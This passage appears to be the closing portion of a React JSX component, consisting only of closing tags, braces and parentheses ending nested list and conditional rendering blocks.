                                  </a>
                                </li>
                              ))}
                            </ul>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  );
}
